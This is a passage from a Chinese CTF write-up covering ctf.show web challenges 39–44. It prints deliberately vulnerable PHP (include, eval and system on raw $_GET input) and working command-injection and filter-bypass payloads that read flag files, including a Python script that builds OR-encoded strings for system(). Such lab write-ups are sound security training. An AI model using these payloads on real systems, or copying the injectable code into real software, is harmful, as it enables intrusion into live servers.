</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在文件包含的时候会在后边加.php，使用web38的payload后边加上//就可以了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://d0f68156-270b-4b09-9858-96cdfcb60a6f.challenge.ctf.show/?c=data://text/palin,&lt;?=system(&#39;tac fla?.???&#39;);?&gt;//
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web40" class="headerLink">
    <a href="#web40" class="header-mark"></a>[web40]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:03:36
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[0-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>payload1</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">c8c8e348</span><span class="o">-</span><span class="mi">2</span><span class="n">afc</span><span class="o">-</span><span class="mi">4708</span><span class="o">-</span><span class="mi">974</span><span class="n">f</span><span class="o">-</span><span class="mi">6397</span><span class="n">d6a41122</span><span class="o">.</span><span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">show</span><span class="o">/</span><span class="err">?</span><span class="n">c</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="n">next</span><span class="p">(</span><span class="n">reset</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">())));</span><span class="o">&amp;</span><span class="mi">1</span><span class="o">=</span><span class="p">;</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;tac</span><span class="si">%20f</span><span class="s2">lag.php&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><code>get_defined_vars()</code> 函数返回当前作用域中的所有已定义变量的数组。</p>
<p><code>reset()</code> 函数将数组指针重置为第一个元素，并返回该元素的值。</p>
<p><code>next()</code> 函数将指针移动到数组的下一个元素，并返回该元素的值。</p>
<p><code>eval()</code> 函数将返回的值作为字符串进行评估，即执行该字符串作为PHP代码。</p>
</blockquote>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131310303.png" title="image-20230702131310303" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131310303.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131310303.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131310303.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131310303.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131310303.png 2x"
            sizes="auto"
            alt="image-20230702131310303">
    </a></figure></p>
<p><strong>payload2</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://c8c8e348-2afc-4708-974f-6397d6a41122.challenge.ctf.show/?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><code>localeconv()</code> 函数返回包含本地化设置的数组。</p>
<p><code>pos()</code> 函数返回数组的当前元素。</p>
<p><code>scandir()</code> 函数返回指定目录中的文件和目录列表。</p>
<p><code>array_reverse()</code> 函数将文件和目录列表按相反的顺序重新排列。</p>
<p><code>next()</code> 函数将指针移动到数组的下一个元素，并返回该元素的值。</p>
<p><code>highlight_file()</code> 函数接受返回的文件路径，并以HTML格式高亮显示该文件的内容。</p>
<p><code>echo</code> 语句将高亮显示的文件内容输出到浏览器。</p>
</blockquote>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131859477.png" title="image-20230702131859477" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131859477.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131859477.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131859477.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131859477.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230702131859477.png 2x"
            sizes="auto"
            alt="image-20230702131859477">
    </a></figure></p>
<h3 id="web41" class="headerLink">
    <a href="#web41" class="header-mark"></a>[web41]</h3><p>过滤了基本上所有的可见字符，但没有过滤或运算符|和双引号”</p>
<p>可以使用或运算构造字符</p>
<p>这里也是直接用了佬写的脚本</p>
<p>通过修改脚本中的参数直接获取flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pythonimport</span> <span class="n">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://8c9b5cd2-3f92-4451-a610-c30153b6063d.challenge.ctf.show/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">ans1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ans2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-&#39;</span><span class="p">,</span><span class="n">c</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">tmp</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print(tmp.group(0))</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">a</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># eval(&#34;echo($c);&#34;);</span>
</span></span><span class="line"><span class="cl"><span class="n">mya</span><span class="o">=</span><span class="s2">&#34;system&#34;</span>  <span class="c1">#函数名 这里修改！</span>
</span></span><span class="line"><span class="cl"><span class="n">myb</span><span class="o">=</span><span class="s2">&#34;tac flag.php&#34;</span>      <span class="c1">#参数</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">myfun</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">my</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">ans1</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">ans2</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">|</span><span class="n">a</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">==</span><span class="nb">ord</span><span class="p">(</span><span class="n">my</span><span class="p">[</span><span class="n">k</span><span class="p">])):</span>
</span></span><span class="line"><span class="cl">                <span class="n">ans1</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">                <span class="n">ans2</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">mya</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">myfun</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">mya</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">data1</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">ans1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">ans2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ans1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">ans2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">myb</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">myfun</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">myb</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">data2</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">ans1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">ans2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;c&#34;</span><span class="p">:</span><span class="n">data1</span><span class="o">+</span><span class="n">data2</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704014037894.png" title="image-20230704014037894" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704014037894.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704014037894.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704014037894.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704014037894.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704014037894.png 2x"
            sizes="auto"
            alt="image-20230704014037894">
    </a></figure></p>
<h3 id="web42" class="headerLink">
    <a href="#web42" class="header-mark"></a>[web42]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/*
</span></span><span class="line"><span class="cl"># -*- coding: utf-8 -*-
</span></span><span class="line"><span class="cl"># @Author: h1xa
</span></span><span class="line"><span class="cl"># @Date:   2020-09-05 20:49:30
</span></span><span class="line"><span class="cl"># @Last Modified by:   h1xa
</span></span><span class="line"><span class="cl"># @Last Modified time: 2020-09-05 20:51:55
</span></span><span class="line"><span class="cl"># @email: h1xa@ctfer.com
</span></span><span class="line"><span class="cl"># @link: https://ctfer.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if(isset($_GET[&#39;c&#39;])){
</span></span><span class="line"><span class="cl">    $c=$_GET[&#39;c&#39;];
</span></span><span class="line"><span class="cl">    system($c.&#34; &gt;/dev/null 2&gt;&amp;1&#34;);
</span></span><span class="line"><span class="cl">}else{
</span></span><span class="line"><span class="cl">    highlight_file(__FILE__);
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><code>system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</code>: <code>system()</code> 函数用于执行操作系统命令。在这里，它执行了一个由变量$c组成的命令。<code>&gt;/dev/null</code> 是一个重定向操作符，用于将命令输出重定向到空设备（即丢弃输出）。<code>2&gt;&amp;1</code> 是将标准错误输出重定向到与标准输出相同的位置。这样做的目的通常是隐藏命令的输出。</p>
</blockquote>
<p>/dev/null 2&gt;&amp;1是不进行回显，所以采用命令把flag打印出来，利用；分隔分化一下 构造payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://69d3026b-8d3d-465d-9e88-de78c94b2173.challenge.ctf.show/?c=tac flag.php;
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704015312035.png" title="image-20230704015312035" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704015312035.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704015312035.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704015312035.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704015312035.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230704015312035.png 2x"
            sizes="auto"
            alt="image-20230704015312035">
    </a></figure></p>
<h3 id="web43" class="headerLink">
    <a href="#web43" class="header-mark"></a>[web43]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:32:51
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>过滤的分号<code>;</code>和<code>cat</code>
过滤分号可以用<code>||</code>来绕过，也可以用<code>%0a</code></p>
<p>构造payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://86675d5f-84b3-463e-b502-aa45872d35e5.challenge.ctf.show/?c=tac flag*%0a
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web44" class="headerLink">
    <a href="#web44" class="header-mark"></a>[web44]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:32:01
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/;|cat|flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://74f7b3e3-07ef-4406-92ce-50ef4a1b36b2.challenge.ctf.show/?c=tac fla*%0a
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web45" class="headerLink">
    <a href="#web45" class="header-mark"></a>[web45]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
